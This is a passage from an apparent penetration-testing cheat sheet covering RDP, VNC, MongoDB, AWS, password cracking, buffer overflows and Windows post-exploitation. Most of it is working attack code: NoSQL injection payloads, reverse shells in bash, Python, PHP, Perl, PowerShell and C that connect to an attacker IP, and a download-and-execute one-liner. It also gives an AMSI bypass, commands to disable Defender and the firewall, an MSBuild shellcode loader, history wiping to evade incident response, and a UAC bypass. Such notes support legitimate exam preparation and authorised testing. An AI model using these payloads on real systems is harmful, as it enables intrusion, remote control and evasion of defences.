  - update.log
  - common.log


## 4.17. 3389 - RDP

Connect to Windows RDP

```sh
xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
# to attach a drive, use:
# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
```

Add RDP User

```bat
net user derp herpaderp /add
net localgroup Administrators derp /add
net localgroup "Remote Desktop Users" derp /add
:: enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
:: delete user
net user hacker /del
:: disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```



## 4.18. 5900 - VNC

VNC is a graphical remote desktop sharing system. Other ports involved in it
are: 5800,5801,5900,5901

```sh
# nmap scan
nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP

# connect ('-passwd passwd.txt' to use password file)
vncviewer $VICTIM_IP

# bruteforcing
hydra -V -f -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
```

## 4.19. 27017 - MongoDB

MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
default.

Compared to SQL databases:
- Instead of tables, it has *collections*
- Instead of rows, it has *documents*
- Instead of columns, it has *fields*

Data is stored using [BSON](https://bsonspec.org/), which is a binary-serialized form of JSON.

```sql
# starting mongo app, connecting to database server
mongosh     # connect to localhost:27017, no creds
mongosh -u <user> -p <password>
mongosh hostname:port
mongosh --host <host> --port <port>

# show list of databases
show databases;
# connect to database named "admin"
use admin;
# list names of collections (tables) in connected database
db.getCollectionNames();
# create new collection (table) called "users"
db.createCollection("users")
# create new document (row) in users collection:
db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpaderp"})
# show all documents (rows) in the users collection:
db.users.find()
# get all documents matching search criteria
db.users.find({id: {$gt: 5}})
# get first matching user document
db.users.findOne({id: '1'})
# change fields in a users document
db.users.update({id:"1"}, {$set: {username: "bubba"}});
# delete a document (by id)
db.users.remove({'id':'1'})
# drop the users collection (delete everything)
db.users.drop()
```

[Operators](https://docs.mongodb.com/manual/reference/operator/query/) (for searches/matching):

- $eq
- $ne
- $gt
- $lt
- $and
- $or
- $where
- $exists
- $regex

### 4.19.1. Exploiting NoSQL Injection

In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:

```
http://example.com/search?username=admin&password[$ne]=derp

# other short examples:
password[$regex]=.*
password[$exists]=true
```

In POST body (JSON):

```json
{"username": admin, "password": {"$ne": null} }

// other examples
{"username": admin, "password": {"$gt": undefined} }
```

SQL vs Mongo injection:

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00

/?search=admin' && this.password//+%00 --> Check if the field password exists
/?search=admin' && this.password.match(/.*/)//+%00 --> Start matching password
/?search=admin' && this.password.match(/^p.*$/)//+%00
/?search=admin' && this.password.match(/^pa.*$/)//+%00
```

Extracting length information:

```
username=admin&password[$regex]=.{1}
username=admin&password[$regex]=.{3}
# True if the length equals 1,3...
```

Building password:

```
username=admin&password[$regex]=p.*
username=admin&password[$regex]=pa.*
username=admin&password[$regex]=pas.*
username=admin&password[$regex]=pass.*
...
# in JSON
{"username": "admin", "password": {"$regex": "^p" }}
{"username": "admin", "password": {"$regex": "^pa" }}
{"username": "admin", "password": {"$regex": "^pas" }}
...
```


## 4.20. Amazon Web Services (AWS) S3 Buckets

Format of the bucket and resource (file) in urls:

```
http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext
http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext
```

If the buckets have ACL rules set to allow `Anyone`, then you can list the
contents as an unauthenticated user. If the ACL allows `AuthenticatedUsers`,
any logged-in AWS customer in the world can list the bucket contents.

Listing bucket contents without being authenticated:

```sh
# over HTTP (can be done in browser)
curl http://irs-form-990.s3.amazonaws.com/

# using the AWS CLI 'ls', '--no-sign-request' means without authentication
aws s3 ls s3://irs-form-990/ --no-sign-request
```

Downloading files from AWS Buckets without being authenticated:

```sh
# over HTTP (can be done in browser)
curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml

# using the AWS CLI 'cp', '--no-sign-request' means without authentication
aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
```

### 4.20.1. AWS Identity and Access Management (IAM)

Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.


#### 4.20.1.1. IAM Access Keys

IAM Access Keys consist of an Access Key ID and the Secret Access Key.

**Access Key IDs** always begin with the letters `AKIA` and are **20 characters long**.
These act as a user name for the AWS API.

The **Secret Access Key** is **40 characters long**. AWS generates both strings;
however, AWS doesn't make the Secret Access Key available to download after the
initial generation.

There is another type of credentials, **short-term credentials**, where the
Access Key ID **begins with the letters `ASIA`** and includes an additional
string called the Session Token.

#### 4.20.1.2. Conducting Reconnaissance with IAM

When you find credentials to AWS, you can add them to your AWS Profile in the
AWS CLI. For this, you use the command:

```sh
aws configure --profile PROFILENAME
```

This command will add entries to the `.aws/config` and `.aws/credentials` files in your user's home directory.

**ProTip**: Never store a set of access keys in the `[default]` profile (without adding the `--profile` flag). Doing so  forces you always to specify a profile and never accidentally run a  command against an account you don't intend to.



A few other common AWS reconnaissance techniques are:

1. Finding the Account ID belonging to an access key:

   `aws sts get-access-key-info --access-key-id AKIAEXAMPLE`

2. Determining the Username the access key you're using belongs to

   `aws sts get-caller-identity --profile PROFILENAME`

3. Listing all the EC2 instances running in an account

   `aws ec2 describe-instances --output text --profile PROFILENAME`

4. Listing all the EC2 instances running in an account in a different region
   `aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME`

4. Listing all secrets stored in AWS Secrets Manager for a given profile
   `aws secretsmanager list-secrets --profile PROFILENAME`

4. Reveal the encrypted contents of a secret (secrets might be region-specific).
   `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`

#### 4.20.1.3. AWS ARNs

An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.

The format is:

```
arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
```

# 5. Exploitation

## 5.1. Searchsploit

```sh
searchsploit -www query # show exploitdb link instead
searchsploit -x /path/to/exploit # read ("eXamine") the exploit file
searchsploit -m /path/to/exploit # mirror exploit file to current directory
```

## 5.2. Password Bruteforcing and Cracking

### 5.2.1. Cracking with John The Ripper

Use john for the common cases of cracking.

```sh
# afer collecting /etc/passwd and /etc/shadow
unshadow passwd shadow > unshadowed

# crack unshadow
# the "=" is required for wordlist
john --wordlist=/mnt/vm-share/rockyou.txt unshadowed

# crack hashes by feeding back in the potfile to a different hash mode
john --loopback --format=nt ntlm.hashes

# feed custom wordlist via stdin
crunch 7 7 -t @@@@@@@ | john --stdin hashes
# can also use "--pipe" to bulk read and allow rules

# resume last cracking session that was stopped mid-way
john --restore

# show cracked hashes from potfile matching those in hashfile
john --show --format=nt hashfile
```

### 5.2.2. Cracking with Hashcat

When to use hashcat:
- You have a hash type that john doesn't understand
- You need MOAR SPEED

```sh
# hashcat doesn't automatically ID hashes like john. You have to specify the
# hash mode manually with the "-m" flag. Look up hashcat modes at:
# https://hashcat.net/wiki/doku.php?id=example_hashes
# or do:
hashcat --help | grep -i "md5"
hashcat --example-hashes | grep -FB2 ' $1$'  # "-F"=force raw string lookup

# specify mangling rules with addition of
-r /usr/share/hashcat/rules/best64.rule
# more extensive rule list:
-r /usr/share/hashcat/rules/d3ad0ne.rule

# basic crack syntax:
# hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]

# common options:
# -a NUM - attack mode (0 = use wordlists, 1 = combo words in list, 3 = brute force)
# -w NUM - workload (2 = default, 3 = degrades your gui, 4 = max)

# cracking /etc/shadow with sha512crypt hashes ("$6$...")
hashcat -m1800 -a0 -w3 shadow /mnt/vm-share/rockyou.txt

# resume last cracking session that was stopped mid-way
hashcat --restore

# showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes
# hashcat has a potfile (hashcat.potfile) to store old passwords
hashcat -m1800 --show --username --outfile-format=2 shadow

# crack all LANMAN hashes with hashcat
# '-1' flag creates a custom alphabet to use in mask as '?1', can do -2, -3
# '--increment/-i' starts at zero-length and increments to full length of mask
# '--potfile-path' specfies custom potfile
hashcat -a 3 -m 3000 -1 "?u?d?s" --increment --potfile-path hashcat.potfile customer.ntds "?1?1?1?1?1?1?1"

# create bruteforce wordlist for all passwords starting with "summer" and ending in 2-4 digits
# '--increment-min' specifies min length to start mask bruteforce
hashcat --stdout -a 3 --increment --increment-min 2 "summer?d?d?d?d" > wordlist
```

NOTE: hashcat doesn't feed usernames into the wordlists automatically like john
does, nor does it automatically reverse the usernames. To do this, you have to
manually add the usernames as an additional wordlist file, and add mangling
rules.

**Attack modes:**

- `0` - Straight: dictionary/wordlist, tries each word from every wordlist file once
- `1` - Combinator: using 2 wordlist files, each word from first file is prepended to each word in second file; can use same file twice
- `3` - Mask: brute force with characters fitting the supplied mask (in place of wordlist)
  - `?l` = lowercase ASCII letters
  - `?u` = uppercase ASCII letters
  - `?d` = digits 0-9
  - `?s` = printable special characters + space
  - `?a` = all of `?l` + `?u` + `?d` + `?s`
  - Example: 1 uppercase, followed by 2 lowercase, followed by 3 digits: `?u?l?l?d?d?d`
- `6` - Hybrid Wordlist + Mask: append mask to each word in wordlist
- `7` - Hybrid Mask + Wordlist: prepend mask to each word in wordlist

### 5.2.3. Zip File Password Cracking

```sh
# using fcrackzip
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip

# using john
zip2john myfile.zip > zipkey.john
john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
```

## 5.3. Buffer Overflows

I wrote a great python script for tackling the old-school OSCP BOF boxes.
Check it out [here](tools/pwn-bof-template.py).

For quick-and dirty offset finding, sometimes you can try something like:

```sh
# using radare2's ragg2 utility for pattern generation:
ragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT
# look up offset (note: must be hex value with '0x' at start!):
ragg2 -q 0x414a4141

# using msf's pattern_create.rb:
msf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT
# look up offset (can be either hex value or string)
msf-pattern_offset -q 2Aa3
```

In Windows' Immunity Debugger, you can use [mona.py](https://github.com/corelan/mona) for building exploits.
Here are some useful commands:

```sh
# To make mona easier to work with, set a custom working folder:
!mona config -set workingfolder c:\mona

# find the offset of EIP register in your buffer:
!mona findmsp -distance <PATTERN_SIZE>
# equivalent to:
msf-pattern_offset -q EIP_VAL

# Check for bad bytes. First start with baseline pattern that uses all bytes
# except null:
!mona bytearray -b "\x00"
# Then compare your memory at ESP with the baseline:
!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDR>
# Finally, add any found bad bytes to the list, repeating the exploit/check
# until you get "Unmodified" status after running the compare command.

# find 'jmp esp' gadget, excluding bad bytes in the pointer
!mona jmp -r esp -cpb '\x00\x51'
```

## 5.4. Reverse Shells

- [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell Generator](https://www.revshells.com/)

Always start your **Netcat Listener** first!

```sh
nc -vlnp LISTEN_PORT
# on mac, exclude the "-p" flag
```

**Netcat Reverse Shell**

```sh
# if netcat has the -e flag:
nc -e /bin/sh 192.168.119.144 443

# if no -e flag:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/f
```

**Bash Reverse Shell**

```sh
# only works on Linux with bash
/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'
```

**Socat Listener**

Great to support full tty and/or encryption. See Socat Reverse Shell (next).

```sh
# full tty over TCP
# "-d -d" prints fatal, error, warning, and notice messages
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT

# no tty, plaintext over TCP
socat -d -d TCP-LISTEN:LISTEN_PORT STDOUT

# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
socat -d -d file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
```

Note: to generate `mycert.pem` see [these instructions](#451-create-self-signed-ssltls-certificate)


**Socat Reverse Shell**

Use with Socat Listener (previous)

```sh
# with full tty
socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:192.168.119.144:443

# no tty, text only
socat EXEC:/bin/bash TCP:192.168.119.144:443

# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.119.144:443,verify=0
```

**Python Reverse Shell**

```sh
python -c 'import os,socket,pty;s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# daemonizing shell for *nix hosts
python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("192.168.119.144",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```


**PHP Reverse Shell**

```sh
# may have to try different socket numbers besides 3 (4,5,6...)
php -r '$sock=fsockopen("192.168.119.144",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Perl Reverse Shell**

```sh
perl -e 'use Socket;$i="192.168.119.144";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Powershell Reverse Shell**

Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.144",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**OpenSSL Encrypted Reverse Shell**

```sh
# generate key on server
openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
# Start server listener
sudo openssl s_server -accept 443 -key key.pem -cert cert.pem

# Client-side reverse shell
rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
```

### 5.4.1. Covering your tracks

When you connect via a reverse/bind shell, your commands get saved in the
terminal history. To avoid logging this (to make incident response team's job
harder), use the following as your first command:

```sh
# for zsh, bash, sh, etc.
unset HISTFILE HISTSIZE HISTFILESIZE
```

```powershell
# for Windows PowerShell
Set-PSReadlineOption –HistorySaveStyle SaveNothing
# - or -
Remove-Module PSReadline
```

### 5.4.2. Running a detached/daeminized process on Linux

When delivering a payload, sometimes it needs to run as a daemon so it doesn't
die when the session/connection is closed. Normally you do this with `nohup`,
`detach`, `screen`, or `tmux`, but sometimes none of those binaries are available.
Still, you can accomplish creating a daemonized process by using sub-shells:

```sh
( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
```


# 6. Windows

## 6.1. Basic Windows Post-Exploit Enumeration

```bat
:: Basic System Info
systeminfo
hostname

:: Who am I?
echo %username%
whoami /all

:: What users/localgroups are on the machine?
net user
net localgroup

:: Who has local admin privileges?
net localgroup Administrators

:: More info about a specific user. Check if user has privileges.
net user user1

:: Current User Domain
echo %userdomain%

:: What Active Directory Domain you belong to
wmic computersystem get domain
systeminfo | findstr /B /C:"Domain"

:: Which Domain Controller you're authenticated to (logonserver)
set l
nltest /dsgetdc:DOMAIN.TLD

:: View Domain Users
net user /domain
:: View Domain Groups
net group /domain

:: View Members of Domain Group
net group /domain "Domain Administrators"
net group /domain "Domain Admins"

:: List saved credentials
cmdkey /list
:: if found, might be able to pivot with:
:: wmic /node:VICTIM_IP process call create "cmd /c powershell -nop -noni -exec bypass -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://ATTACKER_IP/rsh.ps1'))\""
:: or steal creds with mimikatz

:: Firewall
netsh firewall show state
netsh firewall show config

:: Network
ipconfig /all
route print
arp -a
netstat -ano

:: Hard disks
fsutil fsinfo drives

:: User environment
set

:: How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: to pwn: msiexec /quiet /qn /i C:\Users\Public\revshell.msi

:: Does it have AutoRuns with weak permissions?
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: is UAC enabled? EnableLUA = 0x1 means enabled.
:: ConsentPromptBehaviorAdmin = 0x5 is default, requires UAC bypass with MS-signed binary using autoelevate
:: Bad = ConsentPrompt == 2 && SecureDesktopPrompt == 1 (UAC is set to 'Always Notify')
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v PromptOnSecureDesktop

:: Check the powershell version
powershell $PSVersionTable.PSVersion
powershell (Get-Host).Version
powershell $host.Version

:: Can you control the registry of services?
powershell -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
:: if NT AUTHORITY\INTERACTIVE has "FullContol", can pwn with:
:: [5.7.3. Windows Service Escalation - Registry](#573-windows-service-escalation---registry)

:: Can you put programs in the global startup folder?
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
:: look for (F), full access, or (W), write access
:: exploit by dropping reverse shell exe there, wait for admin to log in.

:: Do we have access to the SAM database? CVE-2021-36934, https://www.kb.cert.org/vuls/id/506989
icacls %windir%\system32\config\sam

:: Files of interest (consider pulling for loot)
type %SYSTEMDRIVE%\boot.ini
type %WINDIR%\win.ini
type %WINDIR%\System32\drivers\etc\hosts

:: Scheduled Tasks
schtasks
:: more verbose list
schtasks /query /fo list /v

:: Services running
tasklist /svc
net start
sc queryex type= service state= active
:: List all services
powershell -c "get-service"
sc queryex type= service state= all
:: names only
sc queryex type= service state= all | find /i "SERVICE_NAME:"
:: Stopped services
sc queryex type= service state= inactive
:: Check a service's config settings (look for unquoted service path in BINARY_PATH_NAME)
sc qc SERVICENAME

:: Vulnerable to Print NightMare (CVE-2021-1675, CVE-2021-34527)?
:: Check running Print Spooler service using WMIC
wmic service list brief | findstr "Spool"
powershell Get-Service "Print Spooler"
:: Check Registry to ensure NoWarningNoElevationOnInstall and UpdatePromptSettings
:: either don't exist or are set to 0
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\UpdatePromptSettings"
powershell gci "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

:: Drivers
driverquery
:: Kernel Drivers (for exploit?)
driverquery | findstr Kernel
:: Filesystem drivers
driverquery | findstr "File System"

:: Processes
tasklist
powershell -c "get-process"
wmic process get processid,caption,executablepath,commandline,description

:: Installed Software
dir /b/a:d "Program files" "program Files (x86)" | sort
wmic product get name,version
powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize"

:: Determine .NET version on machine (useful for running C# exploits)
dir C:\windows\microsoft.net\framework\

:: check if PowerShell logging is enabled
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

:: manually enabling PowerShell logging
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
reg add HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f

:: is WSL installed?
powershell -c "Get-ChildItem​ HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{​Get-ItemProperty​ ​$_​.PSPath} | ​out-string​ -width ​4096"
```

## 6.2. Using Saved Windows Credentials

```bat
:: List saved credentials
cmdkey /list
:: Run executable as 'admin' (assuming listed in cmdkey output)
runas /savecred /user:admin C:\Users\Public\revshell.exe
```

## 6.3. Check Windows File Permissions

```bat
:: Using accesschk from SysInternals Suite
:: checking file write permissions
accesschk.exe /accepteula -quvw c:\path\to\some\file.exe
:: checking registry key permissions
accesschk.exe /accepteula -quvwk c:\path\to\some\file.exe
:: checking service configuration change permissions
accesschk.exe /accepteula -quvwc SERVICENAME
:: if you have SERVICE_CHANGE_CONFIG permissions, exploit by changing binpath
:: e.g. sc config SERVICENAME binpath= "net localgroup administrators user /add"
```

## 6.4. Antivirus & Firewall Evasion

### 6.4.1. Windows AMSI Bypass

This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
will e.g. block malicious powershell scripts from running. If you get a warning
saying something like "This script contains malicious content and has been blocked
by your antivirus software", then run this command to disable that blocker.

```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).

### 6.4.2. Turn off Windows Firewall

```bat
:: must be done from administrator prompt
:: Disable Windows firewall on newer Windows:
netsh advfirewall set allprofiles state off
:: Disable Windows firewall on older Windows:
netsh firewall set opmode disable
```

### 6.4.3. Turn off Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 6.4.4. Windows LOLBAS Encoding/Decoding

```bat
:: base64 encode a file
certutil -encode inputFileName encodedOutputFileName
:: base64 decode a file
certutil -decode encodedInputFileName decodedOutputFileName
:: hex decode a file
certutil --decodehex encoded_hexadecimal_InputFileName
:: MD5 checksum
certutil -hashfile somefile.txt MD5
```

### 6.4.5. Execute Inline Tasks with MSBuild.exe

MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
C#/.NET code inline. Modify the XML file below with your shellcode from
msfvenom's "-f csharp" format (or build a payload with Empire's
windows/launcher_xml stager, or write your own C# and host over SMB)

To build:
```bat
:: locate MSBuild executables
dir /b /s C:\msbuild.exe

:: execute 32-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml

:: execute 64-bit shellcode
C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
```

Here's the payload.xml template to inject your shellcode into (if not building
with Empire)

```xml
<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
     shellcode, and build with 64-bit MSBuild.exe
     Building Shellcode:
     msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -f csharp | tee shellcode.cs
-->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>

      <Code Type="Class" Language="cs">
      <!-- to host code remotely, instead use:
      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
      -->
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {
          private static UInt32 MEM_COMMIT = 0x1000;
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
          public override bool Execute()
          {
            //PUT YOUR SHELLCODE HERE;

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

### 6.4.6. Custom Windows TCP Reverse Shell

A custom reverse shell can often get past antivirus.

```c
/* Win32 TCP reverse cmd.exe shell
 * References:
 * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
 * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
 * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
 */
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define TARGET_IP   "192.168.119.144"
#define TARGET_PORT 443

void main(void) {
  SOCKET s;
  WSADATA wsa;
  STARTUPINFO si;
  struct sockaddr_in sa;
  PROCESS_INFORMATION pi;

  WSAStartup(MAKEWORD(2,2), &wsa);
  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
  sa.sin_port = htons(TARGET_PORT);
  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
  SecureZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError = (HANDLE)s;
  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
```

To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):

```sh
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install mingw-w64 wine
i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
```

## 6.5. Windows UAC Bypass

```powershell
# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
fodhelper

# To undo:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

